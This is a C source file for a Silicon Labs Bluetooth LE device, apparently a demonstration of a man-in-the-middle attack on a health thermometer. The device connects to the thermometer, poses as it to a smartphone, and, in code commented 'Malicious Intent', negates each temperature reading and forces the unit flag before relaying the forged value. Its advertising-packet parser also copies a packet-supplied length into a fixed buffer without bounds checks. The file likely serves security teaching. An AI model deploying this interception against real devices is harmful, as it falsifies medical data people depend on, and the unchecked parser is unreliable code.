/***************************************************************************//**
 * @file
 * @brief Core application logic.
 *******************************************************************************
 * # License
 * <b>Copyright 2020 Silicon Laboratories Inc. www.silabs.com</b>
 *******************************************************************************
 *
 * SPDX-License-Identifier: Zlib
 *
 * The licensor of this software is Silicon Laboratories Inc.
 *
 * This software is provided 'as-is', without any express or implied
 * warranty. In no event will the authors be held liable for any damages
 * arising from the use of this software.
 *
 * Permission is granted to anyone to use this software for any purpose,
 * including commercial applications, and to alter it and redistribute it
 * freely, subject to the following restrictions:
 *
 * 1. The origin of this software must not be misrepresented; you must not
 *    claim that you wrote the original software. If you use this software
 *    in a product, an acknowledgment in the product documentation would be
 *    appreciated but is not required.
 * 2. Altered source versions must be plainly marked as such, and must not be
 *    misrepresented as being the original software.
 * 3. This notice may not be removed or altered from any source distribution.
 *
 ******************************************************************************/
#include "em_common.h"
#include "app_assert.h"
#include "app_log.h"
#include "sl_bluetooth.h"
#include "gatt_db.h"
#include "app.h"

typedef struct {
  uint8_t  connection;
  uint32_t service;
  uint16_t characteristic;
  int32_t temperature;
} device_properties_t;

/**************************************************************************//**
 * Static variables.
 *****************************************************************************/
// create health thermometer server object to contain information
static device_properties_t thermo_server;
// create health smart phone object to contain information
static device_properties_t smart_phone;
// The advertising set handle allocated from Bluetooth stack.
static uint8_t advertising_set_handle = 0xff;
// Health Thermometer service UUID defined by Bluetooth SIG
static uint8_t thermoService[2] = { 0x09, 0x18 };
// Temperature Measurement characteristic UUID defined by Bluetooth SIG
static uint8_t thermoCharacter[2] = { 0x1c, 0x2a };
// Device's name of thermometer server to connect
uint8_t target_name[] = "health thermometer";
// flags indicate the discovery for health thermometer service completed
uint8_t discover_service_done = 0;
// flags indicate the discovery for health thermometer characteristic completed
uint8_t discover_characteristic_done = 0;

/**************************************************************************//**
 * Static Functions.
 *****************************************************************************/
/*
 * @brief: Parse advertising packet which received from scanning process to get
 * the device name. which use for finding the device by target name.
 * @param[in]: @input: the input string is used to parsed.
 * @param[in]: @output: the parsed string.
 * @return: NULL.
 */
static void parse_Advertising_Packet(uint8_t *input, uint8_t *output);

/**************************************************************************//**
 * Application Init.
 *****************************************************************************/
SL_WEAK void app_init(void)
{
  /////////////////////////////////////////////////////////////////////////////
  // Put your additional application init code here!                         //
  // This is called once during start-up.                                    //
  /////////////////////////////////////////////////////////////////////////////
  app_log("\n\nSystem Initialization ---> Power on...");
}

/**************************************************************************//**
 * Application Process Action.
 *****************************************************************************/
SL_WEAK void app_process_action(void)
{
}

/**************************************************************************//**
 * Bluetooth stack event handler.
 * This overrides the dummy weak implementation.
 *
 * @param[in] evt Event coming from the Bluetooth stack.
 *****************************************************************************/
void sl_bt_on_event(sl_bt_msg_t *evt)
{
  sl_status_t sc = SL_STATUS_OK;
  uint8_t system_id[8];

  switch (SL_BT_MSG_ID(evt->header)) {
    // -------------------------------
    // This event indicates the device has started and the radio is ready.
    // Do not call any stack command before receiving this boot event!
    case sl_bt_evt_system_boot_id:

      sc = sl_bt_gatt_server_write_attribute_value(gattdb_system_id,
                                                   0,
                                                   sizeof(system_id),
                                                   system_id);
      app_assert_status(sc);

      // start scanning.
      sl_bt_scanner_start(sl_bt_gap_1m_phy, sl_bt_scanner_discover_generic);
      app_assert_status(sc);
      // log to console.
      app_log("\nScanning started!...\n");
      break;

    // -------------------------------
    // This event indicates that a scan report is received.
    case sl_bt_evt_scanner_scan_report_id:
    {
      uint8_t scanned_name[sizeof(target_name)];

      parse_Advertising_Packet(evt->data.evt_scanner_scan_report.data.data,
                               scanned_name);

      if (strcmp((char *)target_name, (char *)scanned_name) == 0) {
        app_log("%s - device found. Start connecting..!\n", scanned_name);
        sl_bt_connection_open(evt->data.evt_scanner_scan_report.address,
                              evt->data.evt_scanner_scan_report.address_type,
                              sl_bt_gap_phy_1m,
                              &thermo_server.connection);
        sc = sl_bt_scanner_stop();
        app_assert_status(sc);
      }
    }
    break;

    // -------------------------------
    // This event indicates that a connection was opened.
    case sl_bt_evt_connection_opened_id:
      app_log("connected.\n");
      if (thermo_server.connection
          == evt->data.evt_connection_opened.connection) {
        app_log("Health Thermometer Server connected\n");
        sc = sl_bt_scanner_stop();
        app_log_status(sc);
        // Create an advertising set.
        sc = sl_bt_advertiser_create_set(&advertising_set_handle);
        app_assert_status(sc);

        // Generate data for advertising
        sc = sl_bt_legacy_advertiser_generate_data(advertising_set_handle,
                                                   sl_bt_advertiser_general_discoverable);
        app_assert_status(sc);

        // Set advertising interval to 100ms.
        sc = sl_bt_advertiser_set_timing(
          advertising_set_handle,   // advertising set handle
          160,   // min. adv. interval (milliseconds * 1.6)
          160,   // max. adv. interval (milliseconds * 1.6)
          0,     // adv. duration
          0);    // max. num. adv. events
        app_assert_status(sc);

        app_log("Start advertising to smart phone.\n");
        // Start advertising and enable connections.
        sc = sl_bt_legacy_advertiser_start(advertising_set_handle,
                                           sl_bt_advertiser_connectable_scannable);
        app_assert_status(sc);
        app_log("Discovering Health thermometer service...\n");
        sl_bt_gatt_discover_primary_services_by_uuid(thermo_server.connection,
                                                     2,
                                                     thermoService);
      } else {
        smart_phone.connection = evt->data.evt_connection_opened.connection;
        app_log("Smart Phone connected\n");
      }
      break;

    // -------------------------------
    // This event indicates that a remote GATT service was discovered
    case sl_bt_evt_gatt_service_id:
      if (evt->data.evt_gatt_service.connection == thermo_server.connection) {
        thermo_server.service = evt->data.evt_gatt_service.service;
        discover_service_done = 1;
      }
      break;

    // -------------------------------
    // This event indicates that a remote GATT characteristic was discovered
    case sl_bt_evt_gatt_characteristic_id:
      if (evt->data.evt_gatt_characteristic.connection
          == thermo_server.connection) {
        thermo_server.characteristic =
          evt->data.evt_gatt_characteristic.characteristic;
        discover_characteristic_done = 1;
      }
      break;

    case sl_bt_evt_gatt_characteristic_value_id:
    {
      uint8_t malicious_data[5];

      /* Grab data and place record temperature value. */
      uint8_t *real_data = evt->data.evt_gatt_characteristic_value.value.data;

      smart_phone.temperature = (real_data[1] << 0)
                                + (real_data[2] << 8)
                                + (real_data[3] << 16);

      // Debug
      app_log("Real Data: %2lu.%02lu\n", (smart_phone.temperature / 1000),
              ((smart_phone.temperature / 10) % 100));

      /* Malicious Intent: Change signs of temperature. */
      smart_phone.temperature = -smart_phone.temperature;

      /* Mask temperature back into char array to send to smartphone. */
      malicious_data[0] = real_data[0] & ~0x01;   // Flags - Make units celcius
      malicious_data[1] = smart_phone.temperature & 0x00FF;
      malicious_data[2] = (smart_phone.temperature >> 8) & 0x00FF;
      malicious_data[3] = (smart_phone.temperature >> 16) & 0x00FF;
      malicious_data[4] = real_data[4];

      /* Indication requires confirmation that data has been received. */
      sl_bt_gatt_send_characteristic_confirmation(thermo_server.connection);

      /* Indicate to smart phone. Send malicious data to smart phone. */
      sl_bt_gatt_server_send_indication(smart_phone.connection,
                                        gattdb_temperature_measurement,
                                        5,
                                        malicious_data);
      app_log("sent to smart phone.\n");
      break;
    }

    // -------------------------------
    // This event indicates that the current GATT procedure was completed.
    case sl_bt_evt_gatt_procedure_completed_id:
      if (discover_service_done == 1) {
        app_log("discover health thermometer service done.\n");
        sl_bt_gatt_discover_characteristics_by_uuid(thermo_server.connection,
                                                    thermo_server.service,
                                                    2,
                                                    thermoCharacter);
        discover_service_done = 0;
        discover_characteristic_done = 1;
        break;
      }
      if (discover_characteristic_done == 1) {
        app_log("discover temperature characteristic done.\n");
        sl_bt_gatt_set_characteristic_notification(thermo_server.connection,
                                                   thermo_server.characteristic,
                                                   sl_bt_gatt_indication);
        discover_characteristic_done = 0;
        break;
      }
      break;
    // -------------------------------
    // This event indicates that a connection was closed.
    case sl_bt_evt_connection_closed_id:
      if (evt->data.evt_connection_closed.connection
          == thermo_server.connection) {
        app_log("Health thermometer server's connection closed");
        // start scanning.
        sl_bt_scanner_start(sl_bt_gap_1m_phy, sl_bt_scanner_discover_generic);
        app_log_status(sc);
        // log to console.
        app_log("\nScanning started!...\n");
      }
      if (evt->data.evt_connection_closed.connection
          == smart_phone.connection) {
        app_log("Smartphone's connection closed");
        // Start advertising and enable connections.
        sc = sl_bt_legacy_advertiser_start(advertising_set_handle,
                                           sl_bt_advertiser_connectable_scannable);
        app_assert_status(sc);
        app_log("Advertising started..");
      }
      break;

    default:
      break;
  }
}

void parse_Advertising_Packet(uint8_t *input, uint8_t *output)
{
  uint8_t Pos_local_name = 9;
  uint8_t index = Pos_local_name;
  uint8_t device_name_length = input[Pos_local_name - 2] + Pos_local_name;

  if (input[Pos_local_name - 1] == 0x09) {
    for (index = Pos_local_name; index < device_name_length; index++)
    {
      output[index - Pos_local_name] = input[index];
    }
    output[index - Pos_local_name - 1] = '\0';
  }
}
